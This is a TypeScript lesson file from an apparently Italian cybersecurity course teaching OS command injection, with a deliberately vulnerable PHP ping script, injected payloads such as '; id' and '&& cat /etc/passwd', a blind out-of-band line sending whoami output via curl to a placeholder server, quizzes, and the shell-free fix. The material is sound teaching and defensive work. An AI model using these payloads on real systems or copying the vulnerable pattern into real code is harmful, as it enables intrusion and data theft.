import type { Lesson } from '@cyberlab/core';

/**
 * Command Injection — la gemella della SQL injection, un piano più in basso.
 *
 * La SQLi che hai appena visto rompe il confine fra dato e *query*; qui il
 * confine rotto è fra dato e *comando di shell*. La struttura mentale è
 * identica — input non fidato concatenato in un interprete — ma la posta è più
 * alta: non stai leggendo una tabella, stai eseguendo comandi sul sistema
 * operativo del server. È il ponte naturale verso il livello Linux.
 */
export const commandInjectionLesson: Lesson = {
  id: 'web.command-injection',
  moduleId: 'mod.web-injection',
  title: 'Command Injection',
  subtitle: 'Quando il tuo input finisce dentro una shell',
  status: 'theory-only',
  difficulty: 'intermediate',
  skills: ['cmdi', 'http'],
  estimatedMinutes: 30,
  prerequisites: ['web.sql-injection'],
  objectives: [
    'Riconoscere quando un input utente raggiunge una shell di sistema.',
    'Usare i metacaratteri della shell per concatenare un comando tuo.',
    'Individuare la command injection cieca, quando l’output non torna indietro.',
    'Correggere alla radice: nessuna shell, argomenti passati come lista.',
  ],
  theory: [
    { id: 'a-h', kind: 'heading', level: 2, eyebrow: 'SECTION A · LA STESSA FRATTURA', text: 'Dal dato al comando' },
    {
      id: 'a-1',
      kind: 'prose',
      text: 'Nella lezione precedente hai visto una SQL injection: un input che smetteva di essere un *valore* e diventava *codice* per il database. La command injection è la stessa idea con un interprete diverso. Un’applicazione ha bisogno di fare qualcosa che il linguaggio non offre — un ping, una conversione di immagine, la creazione di un archivio — e la via più corta è chiedere alla **shell** del sistema operativo. Se un pezzo del tuo input entra in quella riga di comando senza essere isolato, puoi farci finire un comando tuo.',
    },
    {
      id: 'a-flow',
      kind: 'flow',
      title: 'Dove si rompe il confine',
      nodes: [
        { id: 'in', label: 'Input', sublabel: 'host = 8.8.8.8; id', col: 0, row: 1, tone: 'default', tooltip: 'Il client controlla questa stringa per intero.' },
        { id: 'concat', label: 'Concatenazione', sublabel: '"ping -c1 " + host', col: 1, row: 1, tone: 'danger', tooltip: 'Qui il dato diventa parte della riga di comando.' },
        { id: 'shell', label: 'Shell', sublabel: '/bin/sh -c "…"', col: 2, row: 1, tone: 'danger', tooltip: 'La shell interpreta ; | && $() come sintassi, non come testo.' },
        { id: 'os', label: 'Sistema', sublabel: 'esegue tutto', col: 3, row: 1, tone: 'accent', tooltip: 'Ogni comando gira con i privilegi del processo web.' },
      ],
      edges: [
        { from: 'in', to: 'concat' },
        { from: 'concat', to: 'shell', tone: 'danger' },
        { from: 'shell', to: 'os', tone: 'danger' },
      ],
      steps: [
        { label: '1 · L’app vuole solo il ping di un host', highlight: ['in', 'concat'] },
        { label: '2 · Ma la shell legge anche il resto', highlight: ['concat', 'shell'] },
        { label: '3 · E lo esegue con i privilegi del web server', highlight: ['shell', 'os'] },
      ],
    },
    {
      id: 'a-vuln',
      kind: 'code',
      language: 'php',
      filename: 'diagnostica.php — vulnerabile',
      code: `<?php
// L'utente inserisce un host, l'app ne fa il ping.
$host = $_GET['host'];
$output = shell_exec("ping -c 1 " . $host);
echo "<pre>$output</pre>";`,
      highlight: [4],
      annotations: {
        3: '$host arriva intatto dal client: nessun controllo',
        4: 'concatenato dentro una stringa che finisce in /bin/sh',
      },
      caption: 'shell_exec, system, exec, popen, os.system: ogni linguaggio ha la sua porta verso la shell.',
    },
    {
      id: 'a-payload',
      kind: 'code',
      language: 'text',
      filename: 'cosa esegue davvero la shell',
      code: `host = 8.8.8.8; id
→  ping -c 1 8.8.8.8; id

host = 8.8.8.8 && cat /etc/passwd
→  ping -c 1 8.8.8.8 && cat /etc/passwd

host = 8.8.8.8 | whoami
→  ping -c 1 8.8.8.8 | whoami`,
      annotations: {
        2: 'il ; chiude un comando e ne apre un altro: due comandi in una riga',
        5: '&& esegue il secondo solo se il primo riesce',
        8: '| passa l’output del primo in pasto al secondo',
      },
      caption: 'Il ping è solo il travestimento. Il comando che ti interessa viene dopo il separatore.',
    },

    { id: 'b-h', kind: 'heading', level: 2, eyebrow: 'SECTION B · GLI STRUMENTI', text: 'I metacaratteri della shell' },
    {
      id: 'b-table',
      kind: 'table',
      columns: ['Carattere', 'Cosa fa la shell', 'Esempio dopo l’input onesto'],
      rows: [
        [';', 'Separa due comandi, sempre', 'ping 8.8.8.8; id'],
        ['&&', 'Esegue il secondo se il primo riesce', 'ping 8.8.8.8 && id'],
        ['||', 'Esegue il secondo se il primo fallisce', 'ping bad || id'],
        ['|', 'Manda l’output nel comando dopo', 'ping 8.8.8.8 | id'],
        ['$(…) o `…`', 'Sostituisce con l’output del comando interno', 'ping $(whoami).esempio.it'],
        ['\\n', 'Un a capo vale come un ;', 'ping 8.8.8.8%0aid (URL-encoded)'],
      ],
      caption: 'Sono la sintassi normale di ogni shell. Diventano un’arma solo perché l’app li ha lasciati passare.',
    },
    {
      id: 'b-legal',
      kind: 'callout',
      variant: 'legal',
      title: 'Scope: solo sistemi tuoi o autorizzati',
      text: 'Eseguire comandi su un server è, senza un’autorizzazione scritta, accesso abusivo a sistema informatico — un reato, non un dettaglio formale. In questo percorso lo fai in laboratori isolati costruiti per essere colpiti. Fuori di qui servono un contratto di pentest, un programma di bug bounty con quel target in scope, o una macchina che è tua.',
    },

    { id: 'c-h', kind: 'heading', level: 2, eyebrow: 'SECTION C · QUANDO NON VEDI NULLA', text: 'Injection cieca' },
    {
      id: 'c-1',
      kind: 'prose',
      text: 'Spesso l’applicazione non ti restituisce l’output del comando: esegue e tace. Non vuol dire che non sia vulnerabile — vuol dire che devi far parlare il comando in un altro modo. Le due vie classiche sono il **tempo** e la **rete**: costringi il server a mettersi in pausa, o a fare una richiesta verso un sistema che controlli tu.',
    },
    {
      id: 'c-timeline',
      kind: 'timeline',
      entries: [
        { title: 'Prova diretta', text: '`; id` e speri di vedere `uid=…` nella risposta. Se compare, hai chiuso.' },
        { title: 'Basata sul tempo', text: '`; sleep 5` — se la risposta arriva cinque secondi più tardi, il comando è stato eseguito anche senza vederne l’output.', tone: 'success' },
        { title: 'Out-of-band', text: '`; curl http://tuo-server/$(whoami)` — l’output esce come sottodominio o path di una richiesta che arriva a te. Qui la command injection incontra la SSRF, che vedrai più avanti nel livello.', tone: 'success' },
        { title: 'Cieca e distruttiva', text: 'Senza canale di ritorno la tentazione è alzare il rumore. In un test reale è esattamente ciò che non devi fare: dimostra, non danneggiare.', tone: 'danger' },
      ],
    },
    {
      id: 'c-quiz',
      kind: 'quiz',
      question: 'Un endpoint che fa il ping di un host non mostra mai output, ma con `host=8.8.8.8; sleep 5` la risposta arriva 5 secondi dopo. Cosa hai dimostrato?',
      options: [
        { id: 'a', text: 'Niente: senza output non si può concludere nulla' },
        { id: 'b', text: 'Che il server è lento sotto carico' },
        { id: 'c', text: 'Che il tuo comando viene eseguito — il ritardo è la prova, l’output non serve' },
        { id: 'd', text: 'Che c’è una SQL injection' },
      ],
      correct: ['c'],
      explanation:
        'Il ritardo è un canale: se puoi influenzare il tempo di risposta con un comando, quel comando gira. È la stessa logica della SQL injection cieca basata sul tempo che hai incontrato prima — cambia l’interprete, non il ragionamento. Da qui, `sleep` si sostituisce con qualcosa di più utile una volta confermata la vulnerabilità.',
      skills: ['cmdi'],
    },

    { id: 'd-h', kind: 'heading', level: 2, eyebrow: 'SECTION D · LA CORREZIONE', text: 'Togliere la shell di mezzo' },
    {
      id: 'd-compare',
      kind: 'comparison',
      left: {
        label: 'Fragile: filtrare i "cattivi"',
        tone: 'bad',
        language: 'php',
        code: `$host = str_replace(';', '', $host);
shell_exec("ping -c 1 " . $host);`,
        note: 'Una blocklist dimentica sempre qualcosa: restano | && $() newline, e la codifica. Vieti dei caratteri, non risolvi il problema.',
      },
      right: {
        label: 'Corretto: niente shell, argomenti separati',
        tone: 'good',
        language: 'python',
        code: `import subprocess
# Nessuna shell: l'host è UN argomento,
# non può diventare sintassi.
subprocess.run(
    ["ping", "-c", "1", host],
    shell=False, timeout=5
)`,
        note: 'Passando una lista, l’host resta un singolo argomento di ping: i metacaratteri diventano testo inerte.',
      },
    },
    {
      id: 'd-1',
      kind: 'prose',
      text: 'La regola è la stessa che ha chiuso la SQL injection con le query parametrizzate: **non costruire codice concatenando dati**. Per i comandi significa evitare del tutto la shell (`shell=False`, `execve`, le API che prendono una lista di argomenti) così che l’input non possa mai essere interpretato come sintassi. Quando la shell è davvero inevitabile, resta la difesa in profondità — allow-list di valori ammessi, escaping esplicito con le funzioni della piattaforma, e il processo web che gira con privilegi minimi, così che un’eventuale esecuzione trovi poco da fare.',
    },
    {
      id: 'd-quiz',
      kind: 'quiz',
      question: 'Perché passare gli argomenti come lista (`["ping","-c","1",host]`) senza shell risolve il problema, mentre filtrare il `;` no?',
      options: [
        { id: 'a', text: 'Perché la lista è più veloce da eseguire' },
        { id: 'b', text: 'Perché senza shell non c’è nessun interprete che tratti `; | && $()` come sintassi: l’host resta un argomento e basta' },
        { id: 'c', text: 'Perché il filtro sul `;` blocca comunque tutti gli attacchi' },
        { id: 'd', text: 'Perché la lista cifra l’input' },
      ],
      correct: ['b'],
      explanation:
        'Il filtro è una blocklist: enumera i caratteri cattivi e ne dimentica sempre qualcuno. Eliminare la shell rimuove l’interprete che dà un significato speciale a quei caratteri — l’host viene consegnato a `ping` come singolo parametro, punto. Si cambia la struttura del problema invece di rincorrere i sintomi: è lo stesso salto delle query parametrizzate.',
      skills: ['cmdi'],
    },
    {
      id: 'e-kp',
      kind: 'keypoints',
      title: 'Da portarsi via',
      points: [
        'Command injection = SQL injection con la shell al posto del database: input non fidato dentro un interprete.',
        '; && || | $() e il newline sono la sintassi che trasforma un argomento in un secondo comando.',
        'Senza output, il tempo (`sleep`) e le richieste in uscita (out-of-band) sono la prova.',
        'La correzione è strutturale: niente shell, argomenti come lista — non filtrare caratteri.',
        'Ogni comando gira con i privilegi del web server: nel livello Linux vedrai come da lì si sale.',
      ],
    },
  ],
  recap: [
    'La command injection porta l’input non fidato dentro la shell del sistema.',
    'I metacaratteri della shell concatenano un comando tuo a quello previsto.',
    'Quando l’output non torna, il ritardo e i canali out-of-band dimostrano l’esecuzione.',
    'Si corregge eliminando la shell e passando gli argomenti come lista, non filtrando.',
  ],
  furtherReading: [
    { title: 'OWASP: Command Injection', url: 'https://owasp.org/www-community/attacks/Command_Injection' },
    { title: 'PortSwigger: OS command injection', url: 'https://portswigger.net/web-security/os-command-injection' },
    { title: 'OWASP Cheat Sheet: OS Command Injection Defense', url: 'https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html' },
  ],
  exercises: [],
};
